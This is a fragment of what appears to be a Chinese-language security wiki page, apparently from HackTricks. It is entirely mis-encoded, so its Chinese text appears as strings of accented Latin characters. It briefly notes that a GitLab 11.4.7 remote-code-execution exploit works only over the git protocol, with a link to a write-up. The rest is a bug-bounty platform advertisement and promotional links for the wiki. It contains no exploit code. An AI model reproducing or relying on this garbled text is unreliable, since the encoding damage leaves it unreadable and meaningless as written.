ç”±äºæŸç§åŸå› ï¼ˆå¦‚æ¥æºäº[_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)çš„ä½œè€…æ‰€è¿°ï¼‰ï¼Œåˆ©ç”¨åªé€‚ç”¨äº`git`åè®®è€Œä¸é€‚ç”¨äº`http`åè®®ã€‚

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åï¼ŒHackenProofæ‰ä¼šå¯åŠ¨èµé‡‘ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·ä¹‹æ—¶æŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šå¢åŠ å£°èª‰ç§¯åˆ†ï¼Œå¾æœæ¯å‘¨æ’è¡Œæ¦œçš„é¡¶ç«¯ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register)å¹¶ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
